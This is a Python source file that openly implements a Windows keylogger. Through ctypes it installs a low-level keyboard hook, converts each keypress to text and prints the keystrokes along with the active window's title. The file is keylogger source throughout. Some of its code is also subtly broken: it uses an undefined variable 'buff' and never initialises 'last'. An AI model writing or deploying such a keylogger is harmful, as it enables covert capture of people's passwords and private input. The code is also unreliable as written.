# Implementing a local keylogger

# Importing Modules
from ctypes import *
from ctypes import wintypes

# Setting up variables
user32 = windll.user32
LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10


# Win32 Function Definitions
# GetWindowTextLengthA function (Retrieves teh length, in characters, of the specified window's title bar text)
GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE, )
GetWindowTextLengthA.restype = wintypes.INT

# GetWindowTextA Function (Copies the text of the specified window's title bar into a buffer)
GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

# GetKeyState Function (Retrieves the status of the specified virtual key)
GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

# GetKeyboardState Function (Copies the status of the 256 Virtual keys to the specified buffer)
keyboard_state = wintypes.BYTE*256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state), )
GetKeyboardState.restype = wintypes.BOOL

# ToAscii Function (Translate the virtual-key code and keyboard state to the corresponding characters)
ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

# CallNextHookEx Function (Passes the hook information to the next hook procedure in the current hook chain)
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

#SetWindowsHookExA Function (Installs an application defined hook procedure into a hook chain)
HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

# GetMessageA Function (Retrieves a message from the calling thread's message queue. THe function dispatches incoming sent messages until a posted message is available for retrieval)
GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD), 
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

# GetForegroundWindow Function (Retrieves a handle to the foreground window)
def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    
    buff = create_string_buffer(length+1)
    GetWindowTextA(hwnd, buff, length + 1)
    return buff.value

# Settingup the Hook to start the keylogger
def hook_function(nCode, WParam, lParam): # To hook and handle keyboard events
    global last
    if last != get_foreground_process():
        last = get_foreground_process()
        print("\n[{}]".format(last.decode("latin-1")))
    
    if WParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

        state = (wintypes.BYTE*256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))

        buf = (c_ushort*1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print()
            else:
                print("{}".format(string_at(buff).decode("latin-1")), end="", flush=True)

    return CallNextHookEx(hook, nCode, WParam, lParam)

callback = HOOKPROC(hook_function)

hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)
GetMessageA(byref(wintypes.MSG()), 0, 0, 0)